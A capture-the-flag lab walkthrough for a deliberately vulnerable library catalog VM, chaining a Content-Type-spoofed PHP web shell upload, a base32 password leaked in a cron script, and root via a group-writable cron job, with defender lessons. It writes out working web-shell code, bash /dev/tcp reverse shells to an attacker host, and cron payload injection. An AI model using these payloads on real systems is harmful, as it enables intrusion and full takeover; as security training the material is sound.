# Elmridge Community Library — Lab Walkthrough

**Theme:** A small public library, Elmridge Community Library, runs a
self-hosted catalog site with an Inter-Library Loan (ILL) request form.
New patrons attach a scan of their library card to the request; a
contractor's "temporary" upload check only trusts the browser-supplied
file type and was never revisited.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_elmridge.sh` target running on your own isolated lab VM only.
Do not run these techniques against systems you do not own or lack
explicit authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found shortly after landing a web shell, no further
  exploitation required.
- `INTERMEDIATE_FLAG.txt` — found after decoding a leaked note and
  pivoting to a local user account.
- `HARD_FLAG.txt` — found after privilege escalation to root.

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated,
   host-only or NAT'd network (no bridged/public NIC).
2. Copy `setup_elmridge.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_elmridge.sh
   sudo ./setup_elmridge.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean
   restore point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity
   to the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — run nmap's default script set (banner grabs, common misconfig
  checks) against open ports.
- `-sV` — probe open ports to determine service/version.
- `-p-` — scan all 65535 TCP ports instead of just the top 1000.
- `-oN nmap_full.txt` — save human-readable output for later reference.

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

Enumerate the web root:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php
```

You should find:
- `/index.php`
- `/ill_request.php`
- `/ill_uploads/` (empty for now — this is where uploads will land)

Browse to `/ill_request.php` in a browser or with `curl` to see the
form:

```bash
curl http://<target-ip>/ill_request.php
```

Note the upload form field name (`card_scan`) — you'll need it in
Part 3.

---

## Part 2 – Identify Vulnerabilities

### 2a. Client-trusted MIME type on file upload (initial access)

The ILL request form accepts a "library card scan" and only checks the
**browser-supplied** `Content-Type` of the upload against an allow-list
(`image/jpeg`, `image/png`, `image/gif`) — it never inspects the file's
actual extension or contents. Since the `Content-Type` field in a
multipart form upload is set by the client, this check is trivial to
spoof: upload a PHP file, but tell the server it's a JPEG.

Uploaded files land in `/ill_uploads/`, which is inside the web root
and served by Apache with PHP execution enabled — so a `.php` file
placed there will run.

### 2b. Group-writable root cron script (privilege escalation, confirmed later)

Not visible yet — this is discovered *after* you have a shell and can
read `/etc/cron.d/`, in Part 5. Keep it in mind as the final phase of
the chain.

---

## Part 3 – Gain Access

Craft a small PHP web shell:

```bash
cat > shell.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Upload it while spoofing the `Content-Type` header for that specific
form field to `image/jpeg` (curl lets you override the field's
declared MIME type independently of the real file extension):

```bash
curl -F "card_scan=@shell.php;type=image/jpeg" http://<target-ip>/ill_request.php
```

- `-F "card_scan=@shell.php;type=image/jpeg"` — upload `shell.php` as
  the `card_scan` field, but declare its `Content-Type` as
  `image/jpeg`. The server-side check only looks at this
  client-supplied field, so it passes even though the file is PHP.

Confirm the file landed and trigger it:

```bash
curl "http://<target-ip>/ill_uploads/shell.php?cmd=id"
```

You should see `uid=33(www-data) gid=33(www-data) ...` come back — you
have remote code execution as `www-data`.

Grab the easy flag (it lives just outside the web root, but is
readable by `www-data`):

```bash
curl "http://<target-ip>/ill_uploads/shell.php?cmd=cat+/var/backups/library/EASY_FLAG.txt"
```

**🚩 EASY_FLAG captured.**

For anything beyond one-liners, it's worth upgrading to an interactive
shell. One option is a reverse shell back to a listener on your
attacker box:

```bash
# on your attacker box:
nc -lvnp 4444

# trigger via the web shell (URL-encode as needed):
curl -G "http://<target-ip>/ill_uploads/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
```

---

## Part 4 – Lateral Movement / Intermediate Challenge

As `www-data`, look at what's scheduled to run as root:

```bash
cat /etc/cron.d/library-sync
```

```
* * * * * root /bin/bash /opt/library/ill_sync.sh
```

The cron file itself is world-readable, and so is the script it
points to. Read it:

```bash
cat /opt/library/ill_sync.sh
```

You'll find a comment left over from an outage during a system
migration:

```
# Temporary fallback account for manual sync runs if the relay is down
# (contractor left this note during the outage on migration weekend -
# should have been rotated out afterward, ticket LIB-247):
#   user: libclerk
#   pass (base32, so it's not sitting around in plaintext): OJSWCZDJNZTQ====
```

Base32 is an encoding, not encryption — decode it:

```bash
echo "OJSWCZDJNZTQ====" | base32 -d
```

This recovers the plaintext password for `libclerk`. Switch to that
user from your `www-data` shell:

```bash
su libclerk
# password: (the decoded value)
```

Grab the intermediate flag:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

(If you'd rather practice brute-forcing instead of reading the note,
the same password is short and common enough to be cracked directly
over SSH once you know the username — but the intended path here is
finding it in the leaked cron comment, since MySQL/SSH aren't the
vector on this box.)

---

## Part 5 – Privilege Escalation

Check your group memberships as `libclerk`:

```bash
id
```

```
uid=1000(libclerk) gid=1000(libclerk) groups=1000(libclerk),1001(syslib)
```

You're in the `syslib` group. Check the permissions on the script the
root cron job runs every minute:

```bash
ls -l /opt/library/ill_sync.sh
```

```
-rw-rw-r-- 1 root syslib 612 ... /opt/library/ill_sync.sh
```

The `syslib` group has **write** access to a script that root executes
on a one-minute cron cycle. Append a privilege-escalation payload —
for example, make the script copy a root-owned SUID shell for you to
use later, or simply read the flag directly since root will run
whatever you put here within the next 60 seconds:

```bash
echo 'cat /root/HARD_FLAG.txt > /tmp/root_flag_out.txt; chmod 644 /tmp/root_flag_out.txt' >> /opt/library/ill_sync.sh
```

Wait up to a minute for cron to fire, then read the result:

```bash
sleep 65
cat /tmp/root_flag_out.txt
```

If you'd rather land an actual root shell instead of just reading the
flag file, append this instead and catch a listener on your attacker
box beforehand:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/4445 0>&1"' >> /opt/library/ill_sync.sh
```

```bash
# on your attacker box, before the cron tick:
nc -lvnp 4445
```

Once the shell connects, confirm you're root:

```bash
id
```

You should see `uid=0(root)`.

---

## Part 6 – Capture the Three Flags

By the time you finish Part 5 you should have all three:

```bash
# Easy - via the webshell, readable by www-data (Part 3)
cat /var/backups/library/EASY_FLAG.txt

# Intermediate - libclerk's home directory, reached after base32 decode + su (Part 4)
cat /home/libclerk/INTERMEDIATE_FLAG.txt

# Hard - root's home directory, reached via the group-writable cron script (Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Initial access — client-trusted MIME type on upload:** the ILL
   request form's "library card scan" upload only validated the
   browser-supplied `Content-Type` header, which is fully attacker
   controlled. A PHP web shell disguised with a spoofed
   `image/jpeg` type landed inside the web-servable `ill_uploads/`
   directory and executed as `www-data`.
2. **Lateral movement — a leaked credential note in a world-readable
   cron script:** a root-run cron job's script contained a "temporary"
   fallback account, base32-"encoded" for the (false) appearance of
   safety. Because both the cron definition and the script were
   world-readable, any local (or web-shell) foothold could read and
   decode it to obtain the `libclerk` password.
3. **Privilege escalation — group-writable script in root's crontab:**
   `libclerk` belonged to a group with write access to the very script
   root's cron job executed every minute. Editing that script gave an
   attacker arbitrary code execution as root within a minute, with no
   `sudo` rule or SUID binary involved at all — a distinct primitive
   from either of this box's earlier steps.

**Root cause lessons for defenders:**
- Never trust a client-supplied `Content-Type` (or filename) for
  upload validation; check the actual file signature/contents
  server-side, and store uploads outside any web-executable directory.
- Base32/Base64 are encodings, not encryption — never use them to
  "protect" a credential, and don't leave fallback credentials in
  scripts or comments at all.
- Anything executed by root on a schedule (cron, systemd timers) must
  be writable only by root. Group-writable or world-writable scripts
  in root's execution path are equivalent to a direct root shell for
  anyone in that group.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk
   entirely rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `reading` anywhere real).
